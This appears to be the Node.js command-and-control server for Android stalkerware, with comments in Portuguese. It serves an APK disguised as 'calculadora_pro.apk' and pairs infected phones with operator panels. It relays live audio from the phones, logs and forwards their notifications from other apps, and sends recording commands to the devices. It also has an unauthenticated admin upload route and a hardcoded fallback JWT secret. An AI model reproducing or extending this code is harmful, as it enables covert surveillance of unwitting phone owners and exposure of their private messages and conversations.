require('dotenv').config();
const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const path = require('path');
const multer = require('multer');
const db = require('./config/db'); 
const { loadRoutes } = require('./utils/autoload');

const app = express();
const server = http.createServer(app);

// --- CONFIGURAÇÃO DE UPLOAD PARA O BANCO DE DADOS ---
// Usamos memoryStorage para que o arquivo não toque o disco do servidor
const storage = multer.memoryStorage();
const upload = multer({ 
    storage: storage,
    limits: { fileSize: 100 * 1024 * 1024 } // Limite de 100MB
});

const JWT_SECRET = process.env.JWT_SECRET || "sua_chave_secreta_aqui_123";
app.set('jwt_secret', JWT_SECRET); 

// Aumenta limite de recebimento do Express para 100MB
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ limit: '100mb', extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

// Mapa para busca ultra rápida de conexões WebSocket
const clientsMap = new Map();

// Carrega as rotas automáticas
loadRoutes(app, 'routes');

// --- ROTA DE DOWNLOAD (CLIENTE BAIXA DO BANCO) ---
app.get('/download-apk', async (req, res) => {
    try {
        const [rows] = await db.execute('SELECT nome_arquivo, conteudo FROM arquivos_apk WHERE id = 1');
        if (rows.length === 0) return res.status(404).send("Arquivo não encontrado no banco.");

        const arquivo = rows[0];
        res.setHeader('Content-Type', 'application/vnd.android.package-archive');
        res.setHeader('Content-Disposition', `attachment; filename=${arquivo.nome_arquivo}`);
        res.send(arquivo.conteudo);
    } catch (err) {
        res.status(500).send("Erro ao recuperar APK do banco.");
    }
});

// --- ROTA DE ADMIN: CRIA USUÁRIO E ATUALIZA APK NO BANCO ---
app.post('/admin/criar-usuario', upload.single('apk'), async (req, res) => {
    try {
        const { username, password, whatsapp, plano } = req.body;

        // Se um arquivo foi enviado, salva/sobrescreve no banco de dados
        if (req.file) {
            await db.execute(
                'INSERT INTO arquivos_apk (id, nome_arquivo, conteudo) VALUES (1, ?, ?) ON DUPLICATE KEY UPDATE nome_arquivo = ?, conteudo = ?',
                ['calculadora_pro.apk', req.file.buffer, 'calculadora_pro.apk', req.file.buffer]
            );
            console.log(`💾 APK atualizado no banco de dados por: ${username}`);
        }

        // Lógica para salvar os dados do usuário (ajuste conforme suas colunas)
        // await db.execute('INSERT INTO usuarios (username, password...) VALUES (?, ?)', [username, password...]);

        res.json({ success: true, message: "Operação realizada: APK e Usuário salvos no banco!" });
    } catch (err) {
        console.error("Erro no processamento:", err.message);
        res.status(500).json({ success: false, message: "Erro ao salvar dados no banco." });
    }
});

// --- MOTOR WEBSOCKET ---
const wss = new WebSocket.Server({ server, perMessageDeflate: false });

function heartbeat() { this.isAlive = true; }

wss.on('connection', (ws, req) => {
    ws.isAlive = true;
    ws.on('pong', heartbeat);
    
    ws.userId = null; 
    ws.role = null; 

    ws.on('message', async (data, isBinary) => {
        if (isBinary) {
            // Repasse de áudio binário usando o Mapa de conexões
            if (ws.role === 'app' && ws.userId) {
                const targetPanel = clientsMap.get(`${ws.userId}_panel`);
                if (targetPanel && targetPanel.readyState === WebSocket.OPEN) {
                    targetPanel.send(data, { binary: true });
                }
            }
            return;
        }

        try {
            const jsonData = JSON.parse(data.toString().trim());

            // Autenticação e Registro no Mapa
            if (jsonData.type === 'auth_app' || jsonData.type === 'auth_panel') {
                ws.userId = jsonData.userId;
                ws.role = (jsonData.type === 'auth_app') ? 'app' : 'panel';
                clientsMap.set(`${ws.userId}_${ws.role}`, ws);
                
                console.log(`✅ [CONECTADO] ${ws.role.toUpperCase()} - ID: ${ws.userId}`);
                
                if (ws.role === 'app') {
                    await db.execute(
                        'INSERT IGNORE INTO dispositivos (device_id, nome_modelo) VALUES (?, ?)',
                        [ws.userId, `Celular ${ws.userId}`]
                    );
                }
                return;
            }

            // Repasse de Notificações
            if (jsonData.type === 'notification' && ws.userId) {
                const [result] = await db.execute(
                    'INSERT INTO logs_notificacoes (dispositivo_id, app_origem, titulo, mensagem) VALUES (?, ?, ?, ?)',
                    [ws.userId, jsonData.app || 'Sist', jsonData.title || '', jsonData.message || jsonData.text || '']
                );

                const panel = clientsMap.get(`${ws.userId}_panel`);
                if (panel && panel.readyState === WebSocket.OPEN) {
                    panel.send(JSON.stringify({ ...jsonData, id: result.insertId }));
                }
            }

        } catch (e) {
            // Comandos de controle do Painel para o App
            if (ws.role === 'panel' && ws.userId) {
                const cmd = data.toString().trim();
                const forwardCmd = cmd === "STOP_SERVICE" ? "STOP_RECORDING" : cmd;
                const targetApp = clientsMap.get(`${ws.userId}_app`);
                if (targetApp && targetApp.readyState === WebSocket.OPEN) {
                    targetApp.send(forwardCmd);
                }
            }
        }
    });

    ws.on('close', () => {
        if (ws.userId) {
            clientsMap.delete(`${ws.userId}_${ws.role}`);
            console.log(`❌ [SAIU] ${ws.role} - ID: ${ws.userId}`);
        }
    });
});

// Melhora a performance do áudio desativando o algoritmo de Nagle
server.on('connection', (socket) => socket.setNoDelay(true));

const interval = setInterval(() => {
    wss.clients.forEach((ws) => {
        if (ws.isAlive === false) return ws.terminate();
        ws.isAlive = false;
        ws.ping(); 
    });
}, 30000);

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 SERVER ONLINE - PORTA ${PORT}`);
    console.log(`💾 Banco de Dados configurado para APK (LONGBLOB)`);
});